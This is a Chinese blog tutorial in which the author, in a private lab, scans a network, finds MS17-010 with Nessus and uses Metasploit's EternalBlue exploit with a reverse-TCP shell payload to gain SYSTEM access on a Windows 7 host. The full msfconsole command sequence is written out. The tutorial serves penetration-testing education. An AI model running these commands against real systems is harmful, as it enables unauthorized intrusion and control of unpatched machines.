---
link: https://blog.csdn.net/fengzilin1973/article/details/115966135
title: 使用 msf 渗透攻击 win7 主机并远程执行命令
description: 使用 msf 渗透攻击 win7 主机并远程执行命令文章目录使用 msf 渗透攻击 win7 主机并远程执行命令一、扫描局域网存活的主机并判断是否是目标主机1.1 使用  netdiscover 判断该局域网内 IP网段1.2 使用 nmap 扫描 该网段 判断目标主机二、通过Nessus 扫描该主机漏洞三、通过msf模块获取win7主机远程shell总结实验环境Win7 旗舰版 SP1 -64 位kali Linux 2019.1aNessus一、扫描局域网存活的主机并判断是否是目标主机_msf 拿到win7 没有net命令
keywords: msf 拿到win7 没有net命令
author: 丰梓林 Csdn认证博客专家 Csdn认证企业博客 码龄4年 暂无认证
date: 2021-04-21T09:29:14.000Z
publisher: null
stats: paragraph=106 sentences=58, words=285
---
# 使用 msf 渗透攻击 win7 主机并远程执行命令

### 文章目录

* [使用 msf 渗透攻击 win7 主机并远程执行命令](#-msf--win7--0)
*
  - [一、扫描局域网存活的主机并判断是否是目标主机](#-13)
  -
    + [1.1 使用 netdiscover 判断该局域网内 IP网段](#11---netdiscover--ip-15)
    + [1.2 使用 nmap 扫描 该网段 判断目标主机](#12--nmap----25)
  - [二、通过Nessus 扫描该主机漏洞](#nessus--35)
  - [三、通过msf模块获取win7主机远程shell](#msfwin7shell-63)
  - [总结](#-261)



实验环境

* Win7 旗舰版 SP1 -64 位
* kali Linux 2019.1a
* Nessus

## 一、扫描局域网存活的主机并判断是否是目标主机

### 1.1 使用 netdiscover 判断该局域网内 IP网段

打开命令终端输入

```
root@fengzilin53:~# netdiscover
```

![](https://img-blog.csdnimg.cn/img_convert/78149e93f3801e16743a2bbb244366af.png)

### 1.2 使用 nmap 扫描 该网段 判断目标主机

```c#
root@fengzilin53:~# nmap -sS -O 192.168.37.0/24
```

扫描结果为 主机IP地址为 192.168.37.142 是win7 sp1 与目标主机相同

![](https://img-blog.csdnimg.cn/img_convert/5ad6b72654cc87b04b12acbc18a9500d.png)

## 二、通过Nessus 扫描该主机漏洞

Nessus 安装 可用看这篇博客：https://blog.csdn.net/fengzilin1973/article/details/115964676

浏览器输入 地址打开 nessus https://192.168.37.138:8834/

输入用户名及密码 root 123456

![](https://img-blog.csdnimg.cn/img_convert/8714ca7eb4e6e72091df69e1c856468e.png)

选择高级扫描

![](https://img-blog.csdnimg.cn/img_convert/46403c1d0ff331c1f589ecc53d7f0b34.png)

输入对应的信息

![](https://img-blog.csdnimg.cn/img_convert/27a4194dace6d6fa1466e6f503c887cb.png)

启动nessus

![](https://img-blog.csdnimg.cn/img_convert/ff5e046ccb7ee56aa7ff2df873a5131f.png)

扫描结果发现该系统存在 ms17-010

![](https://img-blog.csdnimg.cn/img_convert/6b71e85ca52ab41a81591808aaf36979.png)

## <a name="msfwin7shell_63">;</a> 三、通过msf模块获取win7主机远程shell

模块的整体使用流程如下

![](https://img-blog.csdnimg.cn/img_convert/6548aaeff1cdfb99de932f1441b3280c.png)

我们通过扫描发现目标是存在 ms17-010 漏洞

打开终端 进入metasploit 并查询漏洞

```c#
root@fengzilin53:~# msfconsole -q
msf5 > search ms17-010
```

![](https://img-blog.csdnimg.cn/img_convert/e10c634d8ae95652ffe279627532abf6.png)

使用 use 命令选中 这个模块 并查看模块需要的配置项

```c#
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```

![](https://img-blog.csdnimg.cn/img_convert/c5c6d25531da523d895b97faa4470623.png)

设置主机IP地址 然后运行

```c#
msf5 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 192.168.37.142
msf5 auxiliary(scanner/smb/smb_ms17_010) > run
```

运行之后发现该主机容易受到攻击，也验证了 nessus 扫描的漏洞

![](https://img-blog.csdnimg.cn/img_convert/08f3acda11024bd13d9579d9299c7e08.png)

接下来 查找攻击模块进行

退出上一个

```c#
msf5 auxiliary(scanner/smb/smb_ms17_010) > back
```

然后搜索模块并使加载该攻击模块

```c#
msf5 > search ms17-010
msf5 > use exploit/windows/smb/ms17_010_eternalblue
```

![](https://img-blog.csdnimg.cn/img_convert/39e6c5c05a2f70a11c7d3e21fda4c59f.png)

查看该模块的配置项

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![](https://img-blog.csdnimg.cn/img_convert/99d0129bcd1629a21a8cc13699616358.png)

设置该配置选项

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 192.168.37.142
```

![](https://img-blog.csdnimg.cn/img_convert/27d5bee9f952007ba796a18efb57ef77.png)

查看 exploit target 目标类型

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > show targets
```

可以看到这个模块只有一个 target，所以默认就选择这个目标系统。不需要手动设置。

![](https://img-blog.csdnimg.cn/img_convert/639c773c036e3e90d2d09063deaf0b7b.png)

找一个payload 获取shell 远程连接权限后，进行远程执行命令

注：payload 又称为 攻击载荷，主要用来建立目标机和攻击机稳定连接的，可返回shell ，也可以进行程序 注入

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > search windows/x64/shell type:payload
```

我们挑选一个 反弹 shell 的 payload

![](https://img-blog.csdnimg.cn/img_convert/d35ebde539dd1c5fc203d3c687d9313c.png)

设置 payload

```c#
xploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
```

![](https://img-blog.csdnimg.cn/img_convert/a2d0a552b50fc1af2dc4af86c7b1c066.png)

查看配置选项

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options
```

![](https://img-blog.csdnimg.cn/img_convert/6495b5e2f0a94bed8da45fc81c91acad.png)

设置一下本机 payload 监听地址

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.37.138 //本机 IP
```

![](https://img-blog.csdnimg.cn/img_convert/5bd09bf5da63e88238759c7db5a1bbc7.png)

配置完成后开始执行

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

![](https://img-blog.csdnimg.cn/img_convert/2b21ee37c4648ebd7884ae2c51712322.png)

发现已经拿到 win7的权限了 是乱码，

![](https://img-blog.csdnimg.cn/img_convert/90aa2bb41ae58b982cc25c2f1f6f3564.png)

解决方案

更改终端字符编码即可-选择 配置文件首选项

![](https://img-blog.csdnimg.cn/img_convert/13150fb0a268beca4f1743ccc6832c40.png)

选择最后一个-兼容性-编码-传统 CJK 编码 简体中文-GBK

![](https://img-blog.csdnimg.cn/img_convert/aac31346f5b171fb95c61346619af3e3.png)

效果

![](https://img-blog.csdnimg.cn/img_convert/b51ea2285c30468598a17ce5a915ab77.png)

输入whoami

发现是系统权限，也就是window 的最高权限

![](https://img-blog.csdnimg.cn/img_convert/7b706f6f32ecacb3297d0f1197bba6f5.png)

ctrl+c 关闭链接

y

![](https://img-blog.csdnimg.cn/img_convert/00b49a0c52e00c7f0bd8feb0b4331eb2.png)

通过会话进行连接目标机

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
```

-j 表示后台执行 渗透目标完成后会创建一个 session 我们可以通过 session 连接目标主机。

![](https://img-blog.csdnimg.cn/img_convert/125d4763f1c39a254495928cf433ad8b.png)

```c#
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

![](https://img-blog.csdnimg.cn/img_convert/418cee8090ebe5a16219166b33cf9e3d.png)

通过会话 ID 进入会话

![](https://img-blog.csdnimg.cn/img_convert/955d6e3b60ce936d85d546ee1bd4dc01.png)

或者使用 background 退出会话将会话保存到后台并查看

```c#
C:\Windows\system32>background

Background session 2? [y/N]  y
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

![](https://img-blog.csdnimg.cn/img_convert/00f54f3f34d491107db529588f80bbed.png)

根据ID结束会话

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > sessions -k 2
```

![](https://img-blog.csdnimg.cn/img_convert/a432b1e2d1ede6c3a49b0928795d36ee.png)

## 总结

总结使用 metasploit 攻击的步骤

1. 查找 CVE 公布的漏洞
2. 查找对应的 exploit 模块
3. 配置模块参数
4. 添加 payload 后门
5. 执行 exploit 开始攻击
